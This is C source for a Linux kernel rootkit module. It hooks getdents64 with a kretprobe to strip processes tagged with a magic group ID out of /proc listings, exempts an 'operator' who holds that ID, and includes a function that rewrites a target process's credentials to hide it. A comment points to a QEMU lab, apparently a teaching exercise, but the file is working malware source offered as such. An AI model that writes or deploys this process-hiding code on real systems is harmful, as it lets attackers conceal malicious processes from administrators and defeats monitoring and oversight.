/*
 * proc_hide.c: hide processes with MAGIC_GID from /proc listings
 *
 * When a process lists /proc, remove entries for any process that has
 * MAGIC_GID in its supplementary groups. Use d_path() to identify /proc:
 * do NOT use d_iname(), it returns the device name for mount points, not
 * the path you expect.
 *
 * Operator bypass: if the calling process has MAGIC_GID, skip filtering.
 * Walk cred->group_info directly: do NOT use in_group_p() (returns true
 * for root, which breaks the bypass).
 *
 * proc_hide_add_pid(): add MAGIC_GID to a target process's supplementary
 * groups so it becomes hidden. This hook is separate from file_hide.c.
 *
 * Reference: prochide.c in the QEMU lab
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/ctype.h>
#include <asm/ptrace.h>


#include "rootkit.h"

#define MAX_BUF_SIZE (1 << 16)

static bool process_has_magic_gid(const char *name);

/* Per-instance data passed from entry to return handler */

struct proc_hide_data {
	struct linux_dirent64 __user *dirp;
  unsigned int fd;
};

/* Entry handler */

static int proc_hide_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct pt_regs *inner_regs = (struct pt_regs *)regs->regs[0];
	struct proc_hide_data *data = (struct proc_hide_data *)ri->data;

	/* dirp is the second syscall arg -> regs[1] of the inner pt_regs */
  /* and fd is the first arg -> regs[0] of the inner pt_regs*/
	data->dirp = (struct linux_dirent64 __user *)inner_regs->regs[1];
  data->fd = (unsigned int)inner_regs->regs[0];

	return 0;
}

/* Return handler */

static int proc_hide_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct proc_hide_data *data = (struct proc_hide_data *)ri->data;
	struct linux_dirent64 __user *dirp = data->dirp;
  unsigned int fd = data->fd;
  struct file *file;
	struct linux_dirent64 *current_dir, *prev = NULL;
	int total_bytes = regs_return_value(regs);
	char buf[MAX_PATH_LEN];
  char *kbuf, *path_str;
	int offset = 0;

  /* converting fd to a struct file * */
  file = fget(fd);
  if (!file)
    return 0;

  /* getting absolute filename from d_path() on struct file */
  path_str = d_path(&file->f_path, buf, sizeof(buf));
  if (IS_ERR(path_str)) {
    fput(file);
    return 0;
  }

	/* Nothing to filter if getdents64 returned 0 or error */
	if (total_bytes <= 0) {
		fput(file);
    return 0;
  }

	/* Privileged user sees everything */
	if (caller_has_magic_gid()) {
		fput(file);
    return 0;
  }

  /* Non '/proc' files do not get filtered*/
  if (strncmp(path_str, "/proc", 6) != 0) {
    fput(file);
    return 0;
  }

  fput(file);

	/* Atomic because kretprobe handlers run in atomic context */
	kbuf = kmalloc(total_bytes, GFP_ATOMIC);
	if (!kbuf)
		return 0;

	if (copy_from_user(kbuf, dirp, total_bytes)) {
		kfree(kbuf);
		return 0;
	}

	/* Walk the dirent buffer and remove matching entries */
	while (offset < total_bytes) {
		current_dir = (struct linux_dirent64 *)(kbuf + offset);

		if (process_has_magic_gid(current_dir->d_name) == false) {
			/* No match, advance */
			prev = current_dir;
			offset += current_dir->d_reclen;
		} else if (prev) {
			/* Match, not first entry: prev absorbs current */
			prev->d_reclen += current_dir->d_reclen;
			offset += current_dir->d_reclen;
		} else {
			/* Match, first entry: shift everything forward */
			int reclen = current_dir->d_reclen;

			total_bytes -= reclen;
			memmove(kbuf, kbuf + reclen, total_bytes);
			/* Don't advance offset — new data is at same position */
		}
	}

	/* Write filtered buffer back to userspace and fix return value */
	if (copy_to_user(dirp, kbuf, total_bytes)) {
	kfree(kbuf);
	return 0;
	}

	regs->regs[0] = total_bytes;

	kfree(kbuf);
	return 0;
}

/* Kretprobe definition */

static struct kretprobe proc_hide_krp = {
	.handler       = proc_hide_return,
	.entry_handler = proc_hide_entry,
	.data_size     = sizeof(struct proc_hide_data),
	.maxactive     = 20,
	.kp.symbol_name = "__arm64_sys_getdents64",
};

/* State tracker */

static bool active;

/* Public interface */ 

int proc_hide_init(void)
{
	int ret = register_kretprobe(&proc_hide_krp);
  if (ret < 0){
    pr_err("[proc_hide][error] failed to register kretprobe: %d\n", ret);
    return ret;
  }

  active = true;
  pr_info("[proc_hide] kretprobe registered\n");
	return 0;
}

void proc_hide_exit(void)
{
  if (!proc_hide_is_active()) {
    pr_err("[proc_hide][error] Could not unregister kretprobe; no kretprobe active\n");
    return;
  }
  
  unregister_kretprobe(&proc_hide_krp);
  pr_info("[proc_hide] nmissed counter:%d\n", proc_hide_krp.nmissed);
  active = false;
}

int proc_hide_enable(void)
{
	return proc_hide_init();
}

void proc_hide_disable(void)
{
  proc_hide_exit();
}

bool proc_hide_is_active(void)
{
	return active;
}

/*
 * Add MAGIC_GID to a process's supplementary groups so it becomes hidden.
 */
int proc_hide_add_pid(pid_t pid)
{
	struct task_struct *task;
  struct cred *new_cred;
  struct group_info *old_gi, *new_gi;
  int i;

  rcu_read_lock();
  task = find_task_by_vpid(pid);
  if (!task) {
    rcu_read_unlock();
    return -ESRCH;
  }
  get_task_struct(task);
  rcu_read_unlock();

  new_cred = prepare_kernel_cred(task);
  if (!new_cred) {
    put_task_struct(task);
    return -ENOMEM;
  }

  old_gi = new_cred->group_info;
  new_gi = groups_alloc(old_gi->ngroups + 1);
  if (!new_gi) {
    abort_creds(new_cred);
    put_task_struct(task);
    return -ENOMEM;
  }

  for (i = 0; i < old_gi->ngroups; i++)
    new_gi->gid[i] = old_gi->gid[i];
  new_gi->gid[old_gi->ngroups] = KGIDT_INIT(MAGIC_GID);
  groups_sort(new_gi);
  set_groups(new_cred, new_gi);

  //swap creds on the target task
  rcu_assign_pointer(task->cred, new_cred);

  put_task_struct(task);
  return 0;
}

/* check for MAGIC_GID in a process's supplementary group  */
static bool process_has_magic_gid(const char *name) {
  pid_t pid;
  struct task_struct *task;
  bool hide = false;

  if (kstrtoint(name, 10, &pid) != 0)
    return hide;

  rcu_read_lock();
  task = find_task_by_vpid(pid);
  if (!task) {
    rcu_read_unlock();
    return false;
  }

  if (task) {
    const struct cred *cred = __task_cred(task);
    struct group_info *gi = cred->group_info;
    int i;
    for (i = 0; i < gi->ngroups; i++) {
      if (from_kgid(&init_user_ns, gi->gid[i]) == MAGIC_GID) {
        hide = true;
        break;
      }
    }
  }
  rcu_read_unlock();

  return hide;
}
